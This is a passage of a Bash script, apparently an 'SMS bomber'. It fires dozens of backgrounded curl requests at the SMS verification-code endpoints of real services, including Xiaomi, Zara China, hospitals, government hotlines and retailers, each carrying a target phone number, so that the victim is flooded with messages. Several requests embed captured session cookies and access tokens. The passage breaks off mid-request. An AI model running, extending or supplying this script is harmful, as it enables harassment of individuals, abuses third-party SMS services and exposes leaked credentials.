    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"phone\": \"$phone\"}" &
echo "第40个接口运行完毕"

# 第41个请求
curl -X POST "https://yf.yifengyunche.com/admin/yfycapp/get_sms/secret/f68a6f6e071090621458faeed3cbc781" \
    -H "Host: yf.yifengyunche.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 70" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx21fd3633e52da572/66/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "phone=$phone" \
    --data-urlencode "sms_type=xcx_login" \
    --data-urlencode "uuid=oguyl5B1fCGz-AgAXyi1DEhCykPE" &
echo "第41个接口运行完毕"

#!/bin/bash

# 第42个请求
curl -X POST "https://account.xiaomi.com/pass/sns/wxapp/v2/sendTicket" \
    -H "Host: account.xiaomi.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 34" \
    -H "xweb_xhr: 1" \
    -H "cookie: wxSToken=p+qwiucQZ0j+B76YG0aqz4//m7yT7J6112faWuPTzmhW4wCDtLfGVVYgmru1gP80G+DWjqJOeiJ+abPOim657IxKwTHbe5x3SN5hgpOKR9soC2Kz442TXXKTFFDGnGjU21K1T36ZUayxzPYBGPtlgX5Nq8zIGowlQu9SbrIexoVXE9UfRVbora6qZC7rIARj;" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx183d85f5e5e273c6/15/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "phone=$phone" \
    --data-urlencode "sid=micar_wxlite" &
echo "第42个接口运行完毕"

# 第43个请求
curl -X POST "https://api.kq36.com/public/returnhtm/return_uni-app.asp?cmd=login_user_phone" \
    -H "Host: api.kq36.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 63" \
    -H "ua: {\"v\":3,\"n\":\"mp-weixin\"}" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx01c584b2a7cd0c15/264/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "mobile=$phone" \
    --data-urlencode "typen=login" \
    --data-urlencode "uid=oZqPrs4_EwbdKo5yZsiQhzPr29iA" &
echo "第43个接口运行完毕"

# 第44个请求
curl -X POST "https://newretail2.xianfengsg.com/newretail/api/sms/sendSms" \
    -H "Host: newretail2.xianfengsg.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "self-store-id: 1648354775180" \
    -H "wxa-appid: wxb34bc4be8e276ed8" \
    -H "os-version: wxapp-3.9.6" \
    -H "access-token: eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjM2QSIsInN1YiI6IntcInVzZXJJZFwiOjE3NzI5NTE0MzE1MTM0Mjc5NjksXCJ1c2VyVHlwZVwiOlwiV1hBX1VTRVJcIixcIndvcmtpbmdPcmdJZFwiOjEwMTExLFwid3hhT3BlbmlkXCI6XCJvM1QwYzVQeVFOeHl2VXNwMC0ta3JEVFlkc0VjXCJ9IiwiaWF0IjoxNzExNTM5NTM1LCJleHAiOjE3MTE2MjU5MzV9.Y37exds3aIdi_vq2FbsBmKvpv-sg-NCTSLM886-lgSg" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "delivery-store-id: 1648354775180" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "api-version: 0.0.5" \
    -H "app-version: wxapp-3.1.45" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxb34bc4be8e276ed8/719/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -d "{\"mobile\": \"$phone\"}" &
echo "第44个接口运行完毕"
#!/bin/bash

# 第45个请求
curl -X POST "https://www.zara.cn/itxrest/1/user/store/11716/verify/send-code?languageId=-7" \
    -H "Host: www.zara.cn" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 64" \
    -H "WCTrustedToken: 100240366335%2CwMeokmx34GF0tDE4ONTr9PHYTnUMx3eC31M9idfwvIA%3D" \
    -H "ITX-APPID: ZaraWechat wxd95a72c5f595b6a3" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "WCToken: 100240366335%2CtBMwYGFsn%2BlVqrxv2qna1XpghCNKlMz1lChtTq7W4RFw6%2BU7WHIDBTLhLDo9OMPzb6rpW0EDJ9dU3ZugwHrUzp82IkXOjzA1lTGNVBkX7DR2q7lYVjXaQA1u6NHX%2BKhrhp%2FxCi6GIF651l4L5VkL1CRekO6WfZ2aJUOvi0rA57ZiFyurTvAi%2Bh4TL3UQTdLCLQIbJ46bLsmbQFzpB5qnVvjuPGbV1q6wLjBnLdkSkUgmO1czuQumbu%2BM%2BAQ2i4VR" \
    -H "Content-Type: application/json" \
    -H "xweb_xhr: 1" \
    -H "userId: 100240366335" \
    -H "Cookie: ITXSESSIONID=430432c696c6131368ccd9620151d413; ITXDEVICEID=a9284b4ce3afc90a016fa711c48288a1; IDROSTA=0b77996b5a86:32a914adaff7c6c9fb2b8233d; _abck=1B3AE95117673B9C8CB1ACC89C340C70~-1~YAAQFAWK3qB6eTaOAQAA+DokfwuEW2bTVIIFrymGc6tbIFh8WRyufdH0e0Peo2qrO7VagICwx8wMHFTAG+8bkJy+krieYYFBNcw1hpenGxFnXV6Y/q5utsBzLVy3JuYr7JN0vWdKyFSow69/GYN9i+QGBV7Hvmyf+0+rgIlGsCTWJCReZpziznutoQN33xORc6CaYA3UZc/4xixP6OBTcfR6tsU5C0no8BdbPEo8If1MVgE3sgguJjfSCAWm9yc5sVl5QvZTplp6zF9Cu54QTYYlR0Zs2ywwjEK/ZSScDixvK9U2gmBVGF2snddrsxi9olr0uVMy+yYoZupZha/7ySeRVKfz/kXO6UlDnBNFDciZzmw2gg;JSESSIONID=0000Me_t-Egf2Zj4W3DqjLBVw7-:3aa4aakdv; ITXSESSIONID=430432c696c6131368ccd9620151d413;__mgjuuid=736d90cf-59d4-4016-a462-9323b90d6a1e; bm_sz=3EF6893EDCB93926B93E43151002DC11~YAAQDgWK3uj02zWOAQAAoFgjfxeSyS12EW/VkWXPf0kh8k7ADct2iIktIYfj6AYdZzYLN7+JPb1gHG15nk7txm/A+m8nYOgChvTi0wlHwe78sb/GdcnXOnyIUG2OjaUboiMB0gIfpbvUsqiP3nYTm4dYO3sC+tE5TAlluXsx7QRtNv/QzMUYZc35qXQ2pfoeVS+fNDdEcwzmrJzCBgk5vkhULnR2EAt1oWWDvEZtN9gidAFrUqA+pAzM3lUNCgrhIChz3e+TdKJ6lt5x+pXwPH+FTWDdZd0V6Fwmi1LVs6q+ckzeZGfXcQNsIAPmOwe9DCXPEh+ooH9CwXNxk58JH8u03WaQYffQIyyGH7QodhTl74" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxd95a72c5f595b6a3/334/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\":{\"countryCode\":\"+86\",\"subscriberNumber\":\"$phone\"}}" &
echo "第45个接口运行完毕"

# 第46个请求
curl -X POST "https://xiaoshou.lujiandairy.com/api/wx/send/mobile/bind_mobile" \
    -H "Host: xiaoshou.lujiandairy.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 24" \
    -H "xweb_xhr: 1" \
    -H "role: " \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: " \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx881f659964749509/15/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"mobile\": \"$phone\"}" &
echo "第46个接口运行完毕"

curl -X POST "https://api.kucee.com/website.Access/getPhoneCode" \
    -H "Host: api.kucee.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 136" \
    -H "W-Token: 4276" \
    -H "xweb_xhr: 1" \
    -H "U-Token: " \
    -H "AppId-Token: wx942a1bf556cf82ed" \
    -H "Uni-Code: 633f39b271e585b3ed3af77237320e21" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx942a1bf556cf82ed/1/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\", \"type\": 1, \"lat\": 12435, \"lng\": 8946, \"storeId\": 0, \"appId\": \"wx942a1bf556jsnsb\", \"scene\": 1053}" &
echo "第46个接口运行完毕"
curl -X POST "https://api.jmfww.com/api/Common/GetMobileCode" \
    -H "Host: api.jmfww.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 25" \
    -H "xweb_xhr: 1" \
    -H "Authorization: Bearer" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxe1329bb7bf594139/9/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-urlencode "mobile=$phone" \
    --data-urlencode "type=2" &
echo "第47个接口运行完毕"
curl -X POST "https://ehospital-members.sq580.com/v1_0/ehospital/app/common/sendVerifyCode" \
    -H "Host: ehospital-members.sq580.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 23" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "token: " \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxaf36c6d75fa74101/70/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw "{\"phone\": \"$phone\"}" &
echo "第48个接口运行完毕"

curl -X POST "https://hospital.fjlyrmyy.com/ihp-gateway/api/cms/sendCode" \
    -H "Host: hospital.fjlyrmyy.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 450" \
    -H "Accept: application/json, text/plain, */*" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "Content-Type: application/json" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wxc8153d762f458c41/6/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{
        "transType": "",
        "param": {
            "phone": "'"$phone"'",
            "codeType": "LOGIN",
            "miniOpenId": "o41bz5Tif8yAhus3xP5M4ypm3N0c"
        },
        "pageParam": {},
        "serviceId": "",
        "appId": "8a8a87106b72a440016b72bf44a10000",
        "deviceId": "04daccefc14033ed3d18f157a9f6d1d8",
        "signType": "MD5",
        "termType": "WX_MINI",
        "version": "1.0.0",
        "appVersion": "1.0.0",
        "termId": "1234",
        "alg": "AES",
        "sign": "rasfs2334214fasf",
        "timestamp": "1711476594145",
        "platId": "T2023041400000000001",
        "isEncrypt": 0,
        "sessionId": ""
    }' &
echo "第49个接口运行完毕"
curl -X POST "https://homedoctor.grdoc.org/api/common/captcha/send" \
    -H "Host: homedoctor.grdoc.org" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 126" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "client: windows-applet-1.0.0" \
    -H "token: 69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx931cd4767b40b972/5/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{
        "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
        "role": "user",
        "scene": 1,
        "telephone": "'"$phone"'"
    }' &
echo "第50个接口运行完毕"

curl -X POST "https://homedoctor.grdoc.org/api/common/captcha/send" \
    -H "Host: homedoctor.grdoc.org" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 126" \
    -H "xweb_xhr: 1" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079" \
    -H "client: windows-applet-1.0.0" \
    -H "token: 69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4" \
    -H "Content-Type: application/json" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx931cd4767b40b972/5/page-frame.html" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    --data-raw '{
        "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
        "role": "user",
        "scene": 1,
        "telephone": "'"$phone"'"
    }' &
echo "第50个接口运行完毕"
curl -X GET "https://ai.gzquankeinfo.com:8061/api/sms/sms/valcode?phone=$phone&orgCode=10000001" &
echo "第51个接口运行完毕"
curl -X GET "https://hxxs.mrrac.com/sendCode?mobile=$phone" &
echo "第52个接口运行完毕"
curl -X GET "https://ggfw.rlsbj.cq.gov.cn/xcb/zgbtxt/zpw_hd/code?tel=$phone&uuid=" &
echo "第54个接口运行完毕"
curl -X GET "https://remote-meter.cn:8098/mt-flowJingM/applet/user/profiles/getCode?phone=$phone" &
echo "第55个接口运行完毕"
curl -X GET "https://cxdc.mybti.cn:3700/ps/api/SendVerifyCode?phoneNumber=$phone" &
echo "第56个接口运行完毕"
curl -X GET "https://szjy.yyjqrj.net:9011/api/sms/sms/valcode?phone=$phone&orgCode=" &
echo "第57个接口运行完毕"
curl -X GET "https://isus.vip/cgi.sms.send?mobile=$phone" &
echo "第58个接口运行完毕"
curl -X GET "https://wsylfw.org315.cn/htohcloud-admin/service/getSmsCode?phoneNum=$phone" &
echo "第59个接口运行完毕"
curl -X GET "https://zhaopin.baihepan.com/prod-api/captchaSms?timestamp=1711529949073&phonenumber=$phone" &
echo "第60个接口运行完毕"
curl -X POST "https://maicai.api.ddxq.mobi/user/getSms" \
    -H "Host: maicai.api.ddxq.mobi" \
    -H "Connection: keep-alive" \
    -H "ddmc-city-number: 0101" \
    -H "ddmc-ip: " \
    -H "ddmc-build-version: 4.17.3" \
    -H "ddmc-os-version: Windows 10 x64" \
    -H "ddmc-channel: applet" \
    -H "ddmc-latitude: 0" \
    -H "Cookie: DDXQSESSID=573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g" \
    -H "ddmc-oc_t: 1714851956" \
    -H "ddmc-api-version: 11.17.0" \
    -H "ddmc-longitude: 0" \
    -H "ddmc-SDKVersion: 3.4.3" \
    -H "ddmc-time: 1714852018" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(6.0700.143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat/(6309062b) XWEB/9129" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "ddmc-device-id: osP8I0awRCC_O1WiPSvhuWwJTAD4" \
    -H "ddmc-uid: " \
    -H "xweb_xhr: 1" \
    -H "ddmc-app-client-id: 4" \
    -H "ddmc-station-id: 5500fe01916edfe0738b4e43" \
    -H "ddmc-oc: 99.99999999999999,888.88888888888888" \
    -H "Accept: */*" \
    -H "Sec-Fetch-Site: cross-site" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Referer: https://servicewechat.com/wx1e113254eda17715/609/page-frame.html" \
    --data-raw "uid=&longitude=0&latitude=0&station_id=5500fe01916edfe0738b4e43&city_number=0101&api_version=11.17.0&app_version=4.17.3&channel=applet&app_client_id=4&s_id=573g65h87y59y65v9v4y165dv3657y23xzdvq36g7hvy56lfxi4l83wyi5egj00g&openid=osP8I0awRCC_O1WiPSvhuWwJTAD4&device_id=osP8I0awRCC_O1WiPSvhuWwJTAD4&h5_source=&time=1714852018&device_token=WHJMrwNw1k%2FG0%2Fi%2BZiR4QiSBilQrUFhr7NLVbXikVsBN4l%2BOKowg9f8FaBMv%2BtaRplcweYZ6SDl1r7HAdJk%2F7PjsEueh9QrdCW1tldyDzmauSxIJm5Txg%3D%3D1487582755342&mobile=$phone&verify_code=&type=3&area_code=86&showData=True&app_client_name=wechat&nars=6cbb1f42a9ee475803d1d4e4c1eed7a9&sesi=%257B%2522sesiT%2522%253A%2522FgyjShta664c3c02804207401279c151d7e6f1ac%2522%252C%2522sdkv%2522%253A%25222.0.0%2522%257D" &
echo "第63个接口运行完毕"

curl -X GET "https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone=$phone&type=1" &
echo "第64个接口运行完毕"

curl -X GET "https://s.i.bucg.com/es/sendSms?phone=$phone" &
echo "第65个接口运行完毕"

curl -X GET "https://clgl.cadc.net.cn/api/Base/GetSmsCheckcode?telno=$phone&checkdup=1&areaid=&rolecode=TJKS" &
echo "第66个接口运行完毕"

curl -X GET "https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile=$phone&code=&checkNotFlag=1" &
echo "第67个接口运行完毕"

curl -X GET "https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile=$phone&validateCodeType=01" &
echo "第68个接口运行完毕"

curl -X GET "https://cd12345.pointlinkprox.com:9443/scmd/chain/sendSMSCode?custPhone=$phone&tenantId=83ad2a2955f34ec5b9d30eb590e284d6" &
echo "第69个接口运行完毕"

curl -X GET "https://www.htjdxf.com/prod-api/applet/captcha/send/2/$phone" &
echo "第70个接口运行完毕"

curl -X GET "https://dhswyt.qz-soft.com//tools/wechatmember.ashx?action=SendPhoneCode&phone=$phone" &
echo "第71个接口运行完毕"

curl -X GET "https://yjzl.xzweijiancha.cn/client/front/wxUser/token/$phone" &
echo "第72个接口运行完毕"

curl -X GET "https://bsx.baoding12345.cn/web/bduser/register?mobile=$phone" &
echo "第73个接口运行完毕"

curl -X GET "https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile=$phone&operateType=18" &
echo "第74个接口运行完毕"

curl -X GET "https://cgj.lasa.gov.cn/eGovaPublic/mi/app/sendidentifycode?phoneNum=$phone&corName=egova&isJsonp=1&cityCode=100&terminalID=7&access_token=&token=" &
echo "第75个接口运行完毕"

curl -X GET "http://user.daojia.com/mobile/getcode?mobile=$phone" &
echo "第76个接口运行完毕"

curl -X GET "https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$phone&Captcha=&_=1627172292814" &
echo "第77个接口运行完毕"

curl -X GET "http://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$phone&callback=jQuery112003247368730630804_1643269992344&_=1643269992347" &
echo "第78个接口运行完毕"

curl -X GET "https://m.wanzhoumo.com/proxy?api_path=%2Fuser%2Fmobilelogincode&v=3.0&fields_version=3.3&mobile=$phone" &
echo "第79个接口运行完毕"

curl -X GET "https://jdapi.jd100.com/uc/v1/getSMSCode?account=$phone&sign_type=1&use_type=1" &
echo "第80个接口运行完毕"

curl -X GET "https://xwwl-api.easthope.cn/ums/captcha/driverLoginSms?captchaToken=123&mobile=$phone&imageText=mas6" &
echo "第81个接口运行完毕"

curl -X GET "https://wx.rsj.baoji.gov.cn/bjwxVeifyPhone.action?phone=$phone" &
echo "第82个接口运行完毕"

curl -X GET "https://api.jiuyeyuren.com/api/user/sendcode?phone=$phone&public_source=3&apptype=ysyc" &
echo "第83个接口运行完毕"

curl -X GET "https://shark.x.ufans.cn/bapi/sms?mobile=$phone" &
echo "第84个接口运行完毕"

curl -X GET "https://zwj.ztttb.com/webApp/yn/randNumNoLogin?userMobile=$phone&validateCodeType=01" &
echo "第85个接口运行完毕"

curl -X GET "https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile=$phone&operateType=18" &
echo "第86个接口运行完毕"

curl -X GET "https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel=$phone&type=1" &
echo "第87个接口运行完毕"

curl -X GET "https://gemini.minxundianzi.com/marsplan/mars/user/sendSmsCode?countryCode=86&userTel=$phone&type=1" &
echo "第88个接口运行完毕"

curl -X GET "https://bfat.minxundianzi.com/yunjibodyfat/web/sendSmsCode?countryCode=86&userTel=$phone" &
echo "第89个接口运行完毕"

curl -X GET "https://curiousmore.com/qmore/user/sms/send?is_teach_paypal=true&mobile=$phone" &
echo "第90个接口运行完毕"

curl -X GET "https://www.ruijie.com.cn/application/api/m/sms/send?phone=$phone" &
echo "第91个接口运行完毕"

curl -X GET "https://nf.video/8081/api/auth/get/phone/code?phone=$phone&cid=86" &
echo "第92个接口运行完毕"

curl -X GET "https://applet.mbadashi.com/appletapi/applet/authorizations/smscode?mobile=$phone" &
echo "第93个接口运行完毕"

curl -X GET "https://next.gacmotor.com/mall/center-current-app/login/sendMsg/$phone" &
echo "第94个接口运行完毕"

curl -X GET "https://zybackendf-prod.myquanyi.com/sendverifycode/sendverifycode?_platform_num=153635&mobile=$phone&bus_id=101&tem_id=1001" &
echo "第95个接口运行完毕"

curl -X GET "https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel=$phone&type=1" &
echo "第96个接口运行完毕"

curl -X GET "https://aiyidaijia.kuaimazhixing.com/frontapi/oeapi/prelogin?sig=81777b886918c47d1316d2a5215c2d&appkey=61000211&from=02050060&udid=oLX9N5V-3Ml1EZVcqFr0fg1wERSE&from_type=mini&app_ver=9.6.0&ver=3.4.3&os=windows&source=5&wxAppId=wxb46d03964eecda54&current_city_id=410500&phone=$phone&business=edaijia_" &
echo "第97个接口运行完毕"

curl -X GET "https://fyxrd.168fb.cn/master_renda/public/api/Login/sendsms?phone=$phone&user_type=2" &
echo "第98个接口运行完毕"

curl -X GET "http://user.sanwan.club/push/verificationCode/send?phone=$phone&useSms=true" &
echo "第99个接口运行完毕"

curl -X GET "https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile=$phone" &
echo "第101个接口运行完毕"

curl -X GET "https://12345.scncggzy.com.cn/wx/auth/sendVerificationCode.json?mobile=$phone" &
echo "第102个接口运行完毕"

curl -X GET "https://apis.niuxuezhang.cn/v1/sms-code?phone=$phone" &
echo "第103个接口运行完毕"

curl -X GET "https://uc.17win.com/sms/v4/web/verificationCode/send?mobile=$phone&scene=bind&isVoice=N&appId=08100110010000" &
echo "第104个接口运行完毕"

curl -X GET "https://wccy-server.sxlyb.com/open/v1/login-code/$phone?phone=$phone" &
echo "第105个接口运行完毕"

curl -X GET "https://m.ehaier.com/v3/platform/sms/getSmsCode.json?mobile=$phone&type=login" &
echo "第106个接口运行完毕"

curl -X GET "https://wechat.hfmlgy.com/wechat/set/$phone/QFKJ10001" &
echo "第107个接口运行完毕"

curl -X GET "https://mapi.ekwing.com/parent/user/sendcode?scenes=login&tel=$phone&v=9.0&os=Windows" &
echo "第108个接口运行完毕"

curl -X GET "https://qxt.matefix.cn/api/wx/common/sendMsgCode?mobile=$phone" &
echo "第109个接口运行完毕"

curl -X GET "https://test.ccsc58.com/send_code?phone=$phone&action=regist" &
echo "第110个接口运行完毕"

curl -X GET "https://api.lanniao.com/workerApi/index/sendIdentifySms/$phone" &
echo "第111个接口运行完毕"

curl -X GET "https://bb.hzbeiyang.com/platform/sms/register/V2?mobile=$phone&xcxAppId=wxa663a58156eb05b2" &
echo "第112个接口运行完毕"

curl -X GET "https://m-api.rocketbird.cn/mobile/Index/sendSmsCode?v=1.3.2&phone=$phone&m_openid=o1wsW0eE8ynJnniLNeVartjr3c-s" &
echo "第113个接口运行完毕"

curl -X POST "https://api.paozhengtong.com/notarize/user/sendMessage" \
    -H "Host: api.paozhengtong.com" \
    -H "Connection: keep-alive" \
    -H "Content-Length: 17" \
    -H "scene: pzt_weixin_0.0.116" \
    -H "xweb_xhr: 1" \
    -H "checkSumDTO: {\"appid\":\"20200924001\",\"nonce\":\"554360341071\",\"curtime\":\"1712223908000\",\"checksum\":\"a9ed7bdc8734b150333b59ca005d62082074365f\"}" \
    -H "appid: wx4d68f497875d7e2c" \
